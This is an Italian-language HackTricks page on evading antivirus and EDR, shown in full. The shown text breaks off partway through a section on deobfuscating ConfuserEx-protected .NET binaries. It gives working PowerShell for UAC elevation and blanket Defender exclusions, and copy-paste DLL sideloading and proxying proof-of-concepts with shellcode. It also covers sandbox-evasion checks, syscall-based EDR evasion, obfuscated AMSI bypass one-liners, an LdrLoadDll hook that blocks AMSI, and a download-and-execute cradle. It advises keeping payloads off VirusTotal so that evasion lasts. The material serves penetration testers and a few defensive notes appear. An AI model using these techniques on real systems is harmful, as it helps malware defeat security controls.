# Bypass dell'antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Fermare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire a Windows Defender di funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire a Windows Defender di funzionare simulando un altro AV.
- [Disabilitare Defender se si è amministratori](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di giochi vengono spesso distribuiti come installer Node.js/Nexe non firmati, che prima **chiedono all'utente di ottenere privilegi elevati** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verificare la presenza di un contesto amministrativo con `net session`. Il comando riesce solo quando il chiamante dispone dei diritti di amministratore, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviarsi immediatamente usando il verbo `RunAs` per attivare la consueta richiesta di consenso UAC, mantenendo la riga di comando originale.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Le vittime credono già di installare software “crackato”, quindi di solito accettano la richiesta, concedendo al malware i diritti necessari per modificare i criteri di Defender.<sup>[[26]](#references)</sup>

### Esclusioni `MpPreference` indiscriminate per ogni lettera di unità

Una volta ottenuti i privilegi elevati, le catene in stile GachiLoader ampliano al massimo i punti ciechi di Defender, invece di disabilitare direttamente il servizio. Il loader prima termina il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`) e poi imposta **esclusioni estremamente ampie**, rendendo impossibile la scansione di ogni profilo utente, directory di sistema e disco rimovibile:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Il loop attraversa ogni filesystem montato (D:\, E:\, chiavette USB ecc.), quindi **qualsiasi payload futuro salvato ovunque sul disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è lungimirante: gli attaccanti si riservano la possibilità di caricare driver non firmati in seguito, senza dover intervenire di nuovo su Defender.
- Tutte le modifiche vengono applicate in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di verificare che le esclusioni persistano o di ampliarle senza dover attivare nuovamente l'UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli di integrità più semplici continuano a segnalare che «l'antivirus è attivo», anche se l'ispezione in tempo reale non controlla mai quei percorsi.<sup>[[26]](#references)</sup>

## **Metodologia di AV Evasion**

Attualmente, gli AV usano metodi diversi per verificare se un file è dannoso: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico si ottiene segnalando stringhe dannose note o sequenze di byte in un binario o script, ed estraendo anche informazioni dal file stesso (ad es. descrizione del file, nome della società, firme digitali, icona, checksum ecc.). Ciò significa che l'uso di tool pubblici noti può farti individuare più facilmente, perché probabilmente sono già stati analizzati e segnalati come dannosi. Esistono diversi modi per aggirare questo tipo di rilevamento:

- **Cifratura**

Se cifri il binario, l'AV non potrà rilevare il tuo programma, ma ti servirà un qualche tipo di loader per decifrare ed eseguire il programma in memoria.

- **Offuscamento**

A volte basta modificare alcune stringhe nel binario o nello script per superare i controlli dell'AV, ma questa operazione può richiedere molto tempo, a seconda di cosa vuoi offuscare.

- **Tooling personalizzato**

Se sviluppi i tuoi tool, non esisteranno firme dannose note, ma questo richiede molto tempo e impegno.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica, suddivide il file in più segmenti e chiede a Defender di analizzarli singolarmente; in questo modo può indicarti esattamente quali stringhe o byte nel binario vengono segnalati.

Ti consiglio vivamente di guardare questa [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) dedicata ad AV Evasion pratica.

### Test offline delle caratteristiche PE per i classificatori statici

I byte dei payload compressi o cifrati sono solo uno degli elementi analizzati da un classificatore statico. EMBER2024 estrae caratteristiche PE, inclusi import, export, sezioni, header e dati Authenticode.<sup>[[48]](#references)</sup> In un esperimento con un loader, l'aggiunta di 141 import dall'aspetto innocuo ha ridotto del 93% il punteggio di malignità di EMBER2024, mentre gli import associati al malware lo hanno aumentato. Questo risultato riguarda quel modello e quei campioni e non costituisce un bypass affidabile di uno specifico prodotto AV/EDR.<sup>[[50]](#references)</sup>

Per un test autorizzato di un loader, mantieni costanti il payload e il percorso di esecuzione, modifica una sola variabile di build prevista per ogni variante e confronta i punteggi offline. Esamina le caratteristiche PE risultanti, perché una modifica alla build può influire su più gruppi di caratteristiche.<sup>[[49]](#references)[[50]](#references)</sup> Per mantenere gli import previsti nell'IAT, richiama le API Win32 scelte da codice raggiungibile. Varia la selezione e distribuisci i punti di chiamata tra le diverse build, invece di creare una funzione fissa di camouflage che potrebbe diventare una signature. L'esperimento ha inoltre riportato punteggi più bassi con la firma del codice valida, le voci di export e un maggior numero di funzioni che aumentano le dimensioni di `.pdata`; la firma non valida ha avuto scarso effetto e l'effetto di `.pdata` è stato modesto.<sup>[[50]](#references)</sup>

Il package `thrember` fornisce l'estrazione delle caratteristiche e modelli di benchmark. Dopo averlo installato, usa `thrember.download_models("models")` con una directory `models` già esistente, poi esegui lo scorer dalla directory principale: la funzione di download modifica la directory di lavoro corrente. Il classificatore PE può assegnare un punteggio a una directory di build senza inviarle a un servizio di scansione:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Mantieni fisse le versioni del modello e dell’estrattore di feature durante il confronto. Un punteggio offline più basso mostra solo la reazione di questo classificatore al binario modificato; non dimostra l’elusione dell’analisi comportamentale, dell’emulazione o di un modello diverso di un vendor.<sup>[[49]](#references)[[50]](#references)</sup> Per [il polimorfismo per-build e il camuffamento del binario esterno nei payload virtualizzati](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), consulta il modello di esecuzione separato.

### **Analisi dinamica**

L’analisi dinamica si verifica quando l’AV esegue il tuo binario in una sandbox e monitora eventuali attività dannose (ad esempio, tentare di decrittare e leggere le password del browser, eseguire un minidump di LSASS, ecc.). Questa parte può essere un po’ più complicata, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Attendere prima dell’esecuzione** A seconda di come viene implementato, può essere un ottimo modo per aggirare l’analisi dinamica dell’AV. Gli AV hanno pochissimo tempo per analizzare i file senza interrompere il flusso di lavoro dell’utente, quindi usare attese lunghe può disturbare l’analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare l’attesa, a seconda di come viene implementata.
- **Controllare le risorse della macchina** Di solito le sandbox hanno a disposizione pochissime risorse (ad esempio, < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell’utente. Puoi anche essere molto creativo: ad esempio, controllare la temperatura della CPU o persino la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi prendere di mira un utente la cui workstation è connessa al dominio "contoso.local", puoi controllare il dominio del computer per verificare se corrisponde a quello specificato; in caso contrario, puoi far terminare il programma.

A quanto pare, il computername della sandbox di Microsoft Defender è HAL9TH; quindi puoi controllare il nome del computer nel tuo malware prima della detonazione. Se il nome corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender, quindi puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>

Come abbiamo già detto in questo post, gli **strumenti pubblici** alla fine **vengono rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi eseguire il dump di LSASS, **hai davvero bisogno di usare mimikatz**? O potresti usare un progetto diverso, meno conosciuto, che esegue anch’esso il dump di LSASS?

Probabilmente la risposta giusta è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato. Il progetto in sé è fantastico, ma è anche un incubo da usare per aggirare gli AV; quindi, cerca semplicemente delle alternative per raggiungere il tuo obiettivo.

> [!TIP]
> Quando modifichi i tuoi payload per eludere i rilevamenti, assicurati di **disattivare l’invio automatico dei campioni** in Defender e, per favore, sul serio, **NON CARICARE IL FILE SU VIRUSTOTAL** se il tuo obiettivo è ottenere un’elusione duratura. Se vuoi verificare se un particolare AV rileva il tuo payload, installalo su una VM, prova a disattivare l’invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXE vs DLL

Quando possibile, **dai sempre la priorità all’uso delle DLL per l’elusione**; secondo la mia esperienza, i file DLL vengono solitamente **rilevati e analizzati molto meno**, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se, naturalmente, il tuo payload può essere eseguito come DLL).

Come possiamo vedere in questa immagine, un payload DLL di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload EXE di Havoc e una normale DLL di Havoc</p></figcaption></figure>

Ora vedremo alcuni trucchi che puoi usare con i file DLL per essere molto più furtivo.

## DLL Sideloading & Proxying

**Il DLL Sideloading** sfrutta l’ordine di ricerca delle DLL usato dal loader, posizionando l’applicazione vittima e i payload dannosi uno accanto all’altro.

Puoi individuare i programmi vulnerabili al DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Questo comando mostrerà l’elenco dei programmi soggetti a DLL hijacking all’interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare autonomamente i programmi vulnerabili al DLL Hijack/Sideload**: se eseguita correttamente, questa tecnica è piuttosto stealth, ma se usi programmi pubblicamente noti come vulnerabili al DLL Sideload, potresti farti scoprire facilmente.

Limitarsi a inserire una DLL malevola con il nome di una DLL che un programma si aspetta di caricare non farà caricare il tuo payload, perché il programma si aspetta di trovare funzioni specifiche all’interno di quella DLL. Per risolvere questo problema, useremo un’altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così le funzionalità del programma e consentendo di gestire l’esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/flangvik/)

Questi sono i passaggi che ho seguito:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

L'ultimo comando ci fornirà 2 file: un template del codice sorgente di una DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento pari a 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ti consiglio vivamente** di guardare il [VOD su Twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sul DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire gli argomenti di cui abbiamo parlato.

### Sfruttare gli export inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che sono in realtà dei "forwarder": invece di puntare al codice, la voce di export contiene una stringa ASCII nel formato `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già caricato
- Risolve `TargetFunc` al suo interno

Comportamenti importanti da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (ad es. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene usato il normale ordine di ricerca delle DLL, che include la directory del modulo che esegue la risoluzione del forward.

Questo consente una primitiva di sideloading indiretta: trova una DLL firmata che esporta una funzione inoltrata a un modulo il cui nome non è KnownDLL, quindi posiziona la DLL firmata accanto a una DLL controllata dall'attaccante, con lo stesso nome esatto del modulo di destinazione inoltrato. Quando viene invocato l'export inoltrato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta seguendo il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un `DllMain` minimale per ottenere l'esecuzione di codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamento osservato:
- rundll32 (firmato) carica il `keyiso.dll` side-by-side (firmato)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward a `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementato, riceverai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export inoltrati il cui modulo di destinazione non è un KnownDLL. I KnownDLL sono elencati in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export inoltrati con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento e la difesa:
- Monitora i LOLBins (ad es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di DLL non-KnownDLLs con lo stesso nome base da quella directory
- Genera un avviso per catene di processi/moduli come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` in percorsi scrivibili dagli utenti
- Applica policy di integrità del codice (WDAC/AppLocker) e impedisci la scrittura e l'esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un toolkit di payload per aggirare gli EDR utilizzando processi sospesi, syscall dirette e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire la tua shellcode in modo furtivo.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo strumento; se possibile, prova a concatenare più tecniche di evasione.

## Syscall dirette/indirette e risoluzione SSN (SysWhispers4)

Gli EDR spesso inseriscono **hook inline in user-mode** negli stub delle syscall di `ntdll.dll`. Per aggirare questi hook, puoi generare stub di syscall **dirette** o **indirette** che caricano l'**SSN** (System Service Number) corretto e passano in modalità kernel senza eseguire l'entrypoint esportato sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (senza accedere a un export di `ntdll`).
- **Indirect**: salta a un gadget `syscall` esistente in `ntdll`, così la transizione al kernel sembra originare da `ntdll` (utile per eludere le euristiche); **randomized indirect** sceglie un gadget da un pool per ogni chiamata.
- **Egg-hunt**: evita di incorporare su disco la sequenza statica di opcode `0F 05`; risolve una sequenza syscall in fase di esecuzione.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub syscall in base all'indirizzo virtuale invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dal suo `.text`, poi la smappa (aggira tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento VA con la convalida degli opcode quando uno stub è pulito; se è sottoposto a hook, ricorre alla deduzione tramite VA.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per acquisire l'SSN da `EAX` in fase di esecuzione, senza analizzare i byte sottoposti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per contrastare il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di analizzare solo i **file su disco**, quindi, se riuscivi in qualche modo a eseguire i payload **direttamente in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- Controllo dell'account utente, o UAC (elevazione di EXE, COM, MSI o installazioni ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendone i contenuti in forma non crittografata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` genera il seguente avviso in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come anteponga `amsi:` e poi il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo stati comunque rilevati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene analizzato da AMSI. Questo riguarda persino `Assembly.Load(byte[])` per caricare codice da eseguire in-memory. Per questo motivo, per l'esecuzione in-memory si consiglia di usare versioni precedenti di .NET (come la 4.7.2 o inferiori) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Offuscamento**

Poiché AMSI si basa principalmente su rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche quando hanno più livelli di offuscamento, quindi l'offuscamento potrebbe essere una scelta poco efficace, a seconda di come viene eseguito. Questo rende l'elusione tutt'altro che semplice. A volte, però, basta cambiare un paio di nomi di variabili per risolvere il problema, quindi dipende da quanto un elemento è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo di powershell (e anche in cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente persino con un utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) impedisce l'avvio di qualsiasi scansione per il processo corrente. La cosa è stata divulgata inizialmente da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un uso più diffuso.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

È bastata una riga di codice PowerShell per rendere AMSI inutilizzabile nel processo PowerShell corrente. Naturalmente, questa riga è stata rilevata da AMSI stesso, quindi è necessario modificarla per poter usare questa tecnica.

Ecco un AMSI bypass modificato, tratto da questo [GitHub Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Tieni presente che probabilmente verrà segnalato non appena questo post sarà pubblicato, quindi non dovresti pubblicare codice se il tuo obiettivo è restare inosservato.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG. In questo modo, il risultato della scansione effettiva sarà 0, interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche per bypassare AMSI con PowerShell. Dai un'occhiata a [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e a [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Bloccare AMSI impedendo il caricamento di amsi.dll (hook LdrLoadDll)

AMSI viene inizializzato solo dopo che `amsi.dll` è stata caricata nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'impostare un hook in user mode su `ntdll!LdrLoadDll` che restituisca un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e il processo non esegue alcuna scansione.<sup>[[23]](#references)</sup>

Schema di implementazione (pseudocodice C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e loader personalizzati (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Combinalo con l'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare tracce lunghe nella riga di comando.
- È stato visto in uso con loader eseguiti tramite LOLBins (ad es., `regsvr32` che chiama `DllRegisterServer`).

Anche lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera script per bypassare AMSI.
Anche lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera script per bypassare AMSI evitando le signature tramite funzioni definite dall'utente e randomizzate, variabili ed espressioni con caratteri, e applica una combinazione casuale di maiuscole e minuscole alle parole chiave di PowerShell per evitare le signature.

**Rimuovere la signature rilevata**

Puoi usare strumenti come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questi strumenti funzionano scansionando la memoria del processo corrente alla ricerca della signature AMSI e sovrascrivendola con istruzioni NOP, rimuovendola di fatto dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare un elenco di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano analizzati da AMSI. Puoi farlo così:

```bash
powershell.exe -version 2
```

## PS Logging

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Può essere utile per attività di auditing e troubleshooting, ma può anche rappresentare un **problema per gli attacker che vogliono eludere il rilevamento**.

Per bypassare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare PowerShell Transcription e Module Logging**: a questo scopo puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Usare PowerShell versione 2**: se usi PowerShell versione 2, AMSI non verrà caricato, quindi potrai eseguire gli script senza che vengano analizzati da AMSI. Puoi farlo così: `powershell.exe -version 2`
- **Usare una sessione PowerShell unmanaged**: usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per ospitare PowerShell senza avviare `powershell.exe` (l'approccio usato da `powerpick` di Cobalt Strike). Questo elude i controlli legati specificamente al processo `powershell.exe`, ma non disabilita automaticamente AMSI, Script Block Logging o tutte le altre difese di PowerShell; la copertura dipende dal runtime e dall'implementazione dell'host.


## Obfuscation

> [!TIP]
> Diverse tecniche di obfuscation si basano sulla cifratura dei dati, che aumenta l'entropia del binario e ne facilita il rilevamento da parte di antivirus ed EDR. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune incontrare diversi livelli di protezione che bloccano decompiler e sandbox. Il workflow seguente **ripristina in modo affidabile un IL quasi originale**, che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1.  Rimozione dell'anti-tampering – ConfuserEx cifra ogni *method body* e lo decifra all'interno del costruttore statico del *module* (`<Module>.cctor`). Inoltre, modifica il checksum PE, perciò qualsiasi modifica causerà l'arresto anomalo del binario. Usa **AntiTamperKiller** per individuare le tabelle di metadati cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`), utili per creare un proprio unpacker.

2.  Recupero dei simboli / del flusso di controllo: passa il file *clean* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flag:
     • `-p crx` – seleziona il profilo ConfuserEx 2
     • de4dot annullerà il control-flow flattening, ripristinerà i namespace, le classi e i nomi delle variabili originali e decifrerà le stringhe costanti.

3.  Rimozione delle proxy call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (ovvero *proxy call*) per ostacolare ulteriormente la decompilazione.  Rimuovili con **ProxyCall-Remover**:
   ```bash
